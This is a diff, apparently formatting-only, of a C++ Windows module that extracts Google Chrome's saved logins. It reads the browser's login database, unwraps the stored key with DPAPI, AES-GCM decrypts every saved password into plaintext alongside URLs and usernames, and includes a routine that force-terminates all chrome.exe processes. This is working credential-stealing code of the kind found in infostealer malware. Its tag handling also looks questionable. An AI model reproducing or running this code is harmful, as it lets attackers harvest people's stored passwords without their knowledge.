@@ -11,7 +11,7 @@
 #include <wil/resource.h>
 #include <nlohmann/json.hpp>
 
-chrome::chrome() {}
+chrome::chrome() { }
 
 std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
     std::filesystem::path base_path = get_base_path();
@@ -27,12 +27,12 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
     }
 
     BCryptSetProperty(m_aes_alg.get(), BCRYPT_CHAINING_MODE,
-                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof (BCRYPT_CHAIN_MODE_GCM), 0);
+                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
 
     ULONG bytes_copied;
     BCRYPT_AUTH_TAG_LENGTHS_STRUCT auth_tag_lengths;
     BCryptGetProperty(m_aes_alg.get(), BCRYPT_AUTH_TAG_LENGTH, (PUCHAR)&auth_tag_lengths,
-                      sizeof (auth_tag_lengths), &bytes_copied, 0);
+                      sizeof(auth_tag_lengths), &bytes_copied, 0);
 
     std::vector<uint8_t> auth_tag(auth_tag_lengths.dwMinLength);
 
@@ -59,7 +59,6 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
     key_data = dpapi_decrypt(key_data);
     wil::unique_bcrypt_key key = import_key_data(m_aes_alg, key_data);
 
-
     using unique_sqlite3 = wil::unique_any<sqlite3 *, decltype(&sqlite3_close), sqlite3_close>;
     using unique_sqlite3_stmt = wil::unique_any<sqlite3_stmt *, decltype(&sqlite3_finalize), sqlite3_finalize>;
 
@@ -70,8 +69,8 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
 
     unique_sqlite3_stmt stmt;
     if (sqlite3_prepare_v2(db.get(),
-            "SELECT origin_url, date_created, date_last_used, date_password_modified, username_value, password_value FROM logins",
-            -1, &stmt, NULL) != SQLITE_OK) {
+                           "SELECT origin_url, date_created, date_last_used, date_password_modified, username_value, password_value FROM logins",
+                           -1, &stmt, NULL) != SQLITE_OK) {
         return std::unexpected(browser_error::sqlite_error);
     }
 
@@ -80,6 +79,7 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
     int step_ret = 0;
     while ((step_ret = sqlite3_step(stmt.get())) == SQLITE_ROW) {
         // TODO: tidy
+        // clang-format off
         const std::string    db_origin_url             = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 0));
         const sqlite3_int64  db_date_created           = sqlite3_column_int64(stmt.get(), 1);
         const sqlite3_int64  db_date_last_used         = sqlite3_column_int64(stmt.get(), 2);
@@ -87,29 +87,30 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
         const std::string    db_username_value         = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 4));
         const uint8_t       *db_password_value         = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt.get(), 5));
         const size_t         db_password_value_size    = sqlite3_column_bytes(stmt.get(), 5);
+        // clang-format on
 
         // db_password_value is encrypted with AES
 
         // db_password_value[0,2] is the string "v10" (kEncryptionVersionPrefix), which is skipped
         std::vector<uint8_t> nonce(db_password_value + 3, db_password_value + 15),
-                             ciphertext(db_password_value + 15, db_password_value + db_password_value_size);
+            ciphertext(db_password_value + 15, db_password_value + db_password_value_size);
 
         BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
         BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
         auth_info.pbNonce = nonce.data();
         auth_info.cbNonce = (ULONG)nonce.size();
-        auth_info.pbTag   = auth_tag.data();
-        auth_info.cbTag   = (ULONG)auth_tag.size();
+        auth_info.pbTag = auth_tag.data();
+        auth_info.cbTag = (ULONG)auth_tag.size();
 
         std::string password_plaintext(ciphertext.size(), '\0');
         BCryptDecrypt(
-                key.get(),
-                ciphertext.data(), (ULONG)ciphertext.size(),
-                &auth_info,
-                NULL, 0,
-                reinterpret_cast<PUCHAR>(password_plaintext.data()), (ULONG)password_plaintext.size(),
-                &bytes_copied,
-                0);
+            key.get(),
+            ciphertext.data(), (ULONG)ciphertext.size(),
+            &auth_info,
+            NULL, 0,
+            reinterpret_cast<PUCHAR>(password_plaintext.data()), (ULONG)password_plaintext.size(),
+            &bytes_copied,
+            0);
         password_plaintext.resize(password_plaintext.size() - 16);
 
         using namespace std::chrono;
@@ -122,10 +123,8 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
         // epoch (1601-01-01 00:00:00 UTC)
         auto epoch_offset = seconds{11644473600LL};
 
-        system_clock::time_point date_created
-            {microseconds{db_date_created} - epoch_offset};
-        system_clock::time_point date_password_modified
-            {microseconds{db_date_password_modified} - epoch_offset};
+        system_clock::time_point date_created{microseconds{db_date_created} - epoch_offset};
+        system_clock::time_point date_password_modified{microseconds{db_date_password_modified} - epoch_offset};
 
         // db_date_last_used can be 0 if never used, so check before converting to unix time
         system_clock::time_point date_last_used{};
@@ -134,11 +133,11 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
         }
 
         login l;
-        l.url                    = db_origin_url;
-        l.username               = db_username_value;
-        l.password               = password_plaintext;
-        l.date_created           = date_created;
-        l.date_last_used         = date_last_used;
+        l.url = db_origin_url;
+        l.username = db_username_value;
+        l.password = password_plaintext;
+        l.date_created = date_created;
+        l.date_last_used = date_last_used;
         l.date_password_modified = date_password_modified;
         logins.emplace_back(l);
     }
@@ -161,14 +160,16 @@ std::filesystem::path chrome::get_base_path(void) {
 
 void chrome::kill(void) {
     PROCESSENTRY32W entry;
-    entry.dwSize = sizeof (PROCESSENTRY32W);
+    entry.dwSize = sizeof(PROCESSENTRY32W);
 
     wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));
-    if (!Process32FirstW(snapshot.get(), &entry)) { return; }
+    if (!Process32FirstW(snapshot.get(), &entry)) {
+        return;
+    }
     do {
         if (narrow(entry.szExeFile) == "chrome.exe") {
             wil::unique_handle process(
-                    OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID));
+                OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID));
             if (process) {
                 TerminateProcess(process.get(), 0);
             }
